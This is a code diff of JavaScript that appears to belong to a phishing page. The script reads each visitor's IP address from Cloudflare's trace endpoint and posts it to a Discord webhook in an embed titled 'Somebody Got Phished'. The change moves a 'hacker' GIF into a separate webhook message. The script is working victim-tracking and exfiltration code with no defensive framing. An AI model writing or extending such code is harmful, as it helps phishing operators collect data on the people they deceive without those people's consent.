@@ -45,20 +45,19 @@ fetch("https://www.cloudflare.com/cdn-cgi/trace")
       throw new Error("Failed to extract IP address");
     }
 
-    // Prepare Discord embed
+    // Prepare the IP address embed
     const embed = {
       embeds: [
         {
           title: "Somebody Got Phished",
           color: 15158332, // Blue color
           fields: [{ name: "IP Address", value: ip, inline: true }],
-          image : {url:"https://tenor.com/view/breezy-hacker-im-in-matrix-laptop-gif-22983973"},
           timestamp: new Date(),
         },
       ],
     };
 
-    // Send data to Discord webhook
+    // Send IP information to Discord webhook
     fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -68,6 +67,24 @@ fetch("https://www.cloudflare.com/cdn-cgi/trace")
       .catch((err) => {
         console.error("Error sending to Discord: ", err);
         sendErrorToDiscord(`Failed to send visitor IP to Discord: ${err.message}`);
+      });
+
+    // Send the GIF link separately (not inside an embed)
+    const gifLink = "https://tenor.com/view/breezy-hacker-im-in-matrix-laptop-gif-22983973";
+    
+    const gifMessage = {
+      content: gifLink, // Send the GIF link as plain text
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(gifMessage),
+    })
+      .then(() => console.log("GIF link sent to Discord"))
+      .catch((err) => {
+        console.error("Error sending GIF link to Discord: ", err);
+        sendErrorToDiscord(`Failed to send GIF link to Discord: ${err.message}`);
       });
   })
   .catch((err) => {
